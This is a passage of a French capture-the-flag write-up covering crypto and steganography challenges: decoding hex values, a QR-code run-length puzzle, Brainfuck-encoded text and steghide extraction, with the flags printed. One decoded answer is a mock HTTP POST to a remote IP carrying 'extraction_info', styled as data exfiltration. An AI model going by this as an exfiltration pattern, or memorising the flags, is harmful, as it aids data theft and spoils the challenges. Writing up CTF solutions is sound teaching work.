+['0xb6', '0xa9', '0xc2', '0xcd', '0x8d', '0x99', '0xc0', '0xaa', '0xab', '0xb9', '0xa9', '0xc6', '0x9f', '0xbb', '0xca', '0xcc', '0x0', '0x9e', '0xa2', '0xa9', '0xa1', '0x99', '0xd0', '0xa9', '0xbd', '0x86', '0xc8', '0x86', '0xc8', '0xa3', '0x85', '0xc9', '0x98', '0xbd', '0x88', '0x89', '0xc9', '0x86', '0xc3', '0xbc', '0xd2', '0x0']
+&gt;&gt;&gt; listChaine = chaine.split('\n')
+&gt;&gt;&gt; list(map(lambda x: int(x,16),listChaine))
+[182, 169, 194, 205, 141, 153, 192, 170, 171, 185, 169, 198, 159, 187, 202, 204, 0, 158, 162, 169, 161, 153, 208, 169, 189, 134, 200, 134, 200, 163, 133, 201, 152, 189, 136, 137, 201, 134, 195, 188, 210, 0]
+&gt;&gt;&gt; intList = list(map(lambda x: int(x,16),listChaine)
+&gt;&gt;&gt; list(map(lambda x: abs(x-0x55),intList))
+[97, 84, 109, 120, 56, 68, 107, 85, 86, 100, 84, 113, 74, 102, 117, 119, 85, 73, 77, 84, 76, 68, 123, 84, 104, 49, 115, 49, 115, 78, 48, 116, 67, 104, 51, 52, 116, 49, 110, 103, 125, 85]
+&gt;&gt;&gt; rotList = list(map(lambda x: chr(abs(x-0x55)),intList))
+&gt;&gt;&gt; rotList
+['a', 'T', 'm', 'x', '8', 'D', 'k', 'U', 'V', 'd', 'T', 'q', 'J', 'f', 'u', 'w', 'U', 'I', 'M', 'T', 'L', 'D', '{', 'T', 'h', '1', 's', '1', 's', 'N', '0', 't', 'C', 'h', '3', '4', 't', '1', 'n', 'g', '}', 'U']
+&gt;&gt;&gt; chn = &quot;&quot;.join(rotList)
+&gt;&gt;&gt; chn
+'aTmx8DkUVdTqJfuwUIMTLD{Th1s1sN0tCh34t1ng}U'
+</code></pre>
+
+<p>On récupère donc le flag IMTLD{Th1s1sN0tCh34t1ng}.</p>
+
+<p><br/></p>
+
+<h2 id="stéganographie-et-cryptographie">Stéganographie et Cryptographie</h2>
+
+<h3 id="slept-on-the-keyboard-50-pts">Slept on the keyboard - 50 pts</h3>
+
+<p>Le challenge démarre avec un QRcode à scanner. Ce dernier donne une chaine binaire.</p>
+
+<pre><code>$ zbarimg qrcode.png -q --raw
+QR-Code:001110010011100100111001001110010110010001100100011001000110010000110100001101000011010000110100001101000110001101100011011000110110001100110100001101000011010000110100011000100110001001100010011000100110001001100010011000100011001100110011001100110011001100110100001101000011010000110100001101000011010000110100001101000011010000110100001100000011000000110000011001010110010101100101011001010110010101100101001101000011010000110100001101000011010000111000001110000011100000111000001110000011100000110011001100110011001101100010011000100110001001100010001100110011001100110011001110010011100100111001001110010011100100111001001110010011001000110010001100100011001000110010001100100011000000110000001100000011010000110100001101000011001000110010001100100011001000110010001100100011001000110100001101000011010000110100001101000011010001100100011001000110010001100100011001000110010001100100
+</code></pre>
+
+<p>Le binaire correspond en réalité à la chaine ASCII ci-dessous.</p>
+
+<pre><code>9999dddd44444cccc4444bbbbbbb33334444444444000eeeeee44444888888333bbbb33399999992222220004442222222444444ddddddd
+</code></pre>
+
+<p>Après quelques essais et quelques tests, il semble que le résultat se trouve dans la répétition des caractères. En effet, prenons l&rsquo;exemple des 3 premières séquences :</p>
+
+<ul>
+<li>9999 &ndash;&gt; 4 fois le chiffre 9 &ndash;&gt; 49 &ndash;&gt; La lettre &ldquo;I&rdquo; en hex ;</li>
+<li>dddd &ndash;&gt; 4 fois le chiffre d &ndash;&gt; 4d &ndash;&gt; La lettre &ldquo;M&rdquo; en hex</li>
+<li>44444 &ndash;&gt; 5 fois le chiffre 4 &ndash;&gt; 54 &ndash;&gt; La lettre &ldquo;T&rdquo; en hex</li>
+</ul>
+
+<p>En suivant cette logique, on retrouve assez rapidement le flag IMTLD{C4t0nTh3K3yb04rd}.</p>
+
+<p><br/></p>
+
+<h3 id="xtracted-100-pts">Xtracted - 100 pts</h3>
+
+<p>Le fichier &ldquo;encoded.wtf&rdquo; est en réalité un fichier texte composé des caractères suivants.</p>
+
+<pre><code>++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;++++++++++.-.++++.+.&lt;++.+++++++++++++++.---------------.&gt;------------.++++++++++++..----.&lt;+++++++++++++++.++.---.+++.&lt;++++++++++.&gt;&gt;--------.&gt;+++++++++++.++++.+.&lt;&lt;+++++++++.&lt;++++++++++++++++++++++.&gt;-----.----.---.+++++++++.--.-------.++++.--.++.----.+++..++.&lt;++++++++++.&gt;&gt;-----.&gt;-----.-.++++++.---------------.+++++++++.++++++.&lt;&lt;------.&gt;+++++++++++++++++.&gt;+++++.---------.-----------.&lt;&lt;+++++++++++++.&lt;++++++++++++++++++++++.&gt;&gt;&gt;----.+++++++++++++++..----.---.------.--.+++++++++++++++++++.-----------.++++++.-.&lt;&lt;-----------.&gt;&gt;++++++++++.&lt;&lt;--.&gt;&gt;-...&lt;&lt;.&gt;&gt;-----------------.+++++++++.+++.-----.&lt;&lt;.&gt;&gt;++++++++.---.------.-------.+++++++++.-----------.++++++++++++.-----------.+.-.&lt;&lt;&lt;++++++++++.&gt;&gt;&gt;+.+++++++++++++++++++.----.--.&lt;+++++++++++++.++.&gt;++.&lt;++++++.&gt;-----.-.&lt;----------.&gt;-----.+++++.&lt;+++++++.&gt;+.&lt;&lt;++++++++++++++++.++++++++++++.++++.+++++++.--------.--------.&gt;&gt;++++++++++++.&lt;--------------.&gt;-------.--.&lt;&lt;----------------.&gt;+++++++++++.&gt;++.&lt;----.&lt;++++++++++++++++.----------------.&gt;&gt;.&lt;&lt;.&gt;.-----------.&lt;----.&gt;+++++++++++.&gt;--.&lt;&lt;+++.&gt;&gt;-----.&lt;&lt;---.&gt;&gt;+++++++.&lt;&lt;+++.&gt;.&gt;-.&lt;&lt;.&gt;&gt;-.++++.&lt;&lt;.&gt;-------------.&gt;+++++++.
+</code></pre>
+
+<p>Assez rapidement, on se rend compte qu&rsquo;il s&rsquo;agit d&rsquo;un texte codé en langage &ldquo;Brainfuck&rdquo;. Ainsi, on peut le décoder avec un utilitaire en ligne et retrouver le flag :).</p>
+
+<pre><code>POST / HTTP/1.1 Host:*51.75.202.1134Content-Type:Japplication/x-www-form-urlencodedTextraction_info=IMTLD{Xtr4ct_D4t4_T0_r3m0t3_s3rv3R}
+</code></pre>
+
+<p><br/></p>
+
+<h3 id="stego101-150-pts">Stego101 - 150 pts</h3>
+
+<p>Ce challenge permet de retrouver deux concepts très simples que l&rsquo;ont peut voir dans les premiers challenges de stéganographie. La première étape est d&rsquo;aller regarder du côté des métadonnées. On y trouve notamment un commentaire &ldquo;steghide : doyouknowdaway&rdquo;.</p>
+
+<pre><code>$ exiftool challenge.jpg                                                                                                                                                   
+ExifTool Version Number         : 11.11
+File Name                       : challenge.jpg
+Directory                       : .
+File Size                       : 7.0 kB
+File Modification Date/Time     : 2018:12:19 15:03:41+01:00
+File Access Date/Time           : 2018:12:25 22:31:35+01:00
+File Inode Change Date/Time     : 2018:12:19 20:17:05+01:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 300
+Y Resolution                    : 300
+Comment                         : steghide : doyouknowdaway
+Image Width                     : 297
+Image Height                    : 153
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 297x153
+Megapixels                      : 0.045
+</code></pre>
+
+<p>L&rsquo;indice indique l&rsquo;utilisation de l&rsquo;outil <code>steghide</code> permettant notamment d&rsquo;embarquer des données dans une image puis de les extraire, à l&rsquo;aide d&rsquo;un mot de passe. Ainsi, on récupère un fichier grâce au mot de passe trouvé dans les métadonnées de l&rsquo;image.</p>
+
+<pre><code>$ steghide extract -sf challenge.jpg                                                                                                                                       
+Enter passphrase: 
+wrote extracted data to &quot;flag.txt&quot;.
+</code></pre>
+
+<p>Le fichier contient le flag IMTLD{st3g4N0gr4phY_c4N_b3_r34llY_s1mpl3}.</p>
+
+<p><br/></p>
+
+<h2 id="le-mot-de-la-fin">Le mot de la fin</h2>
+
+<p>Vivement la prochaine édition !</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/fr/writeups/ecw-2018/web-intrusion/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">ECW 2018 - Web - Intrusion (5 challenges)</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
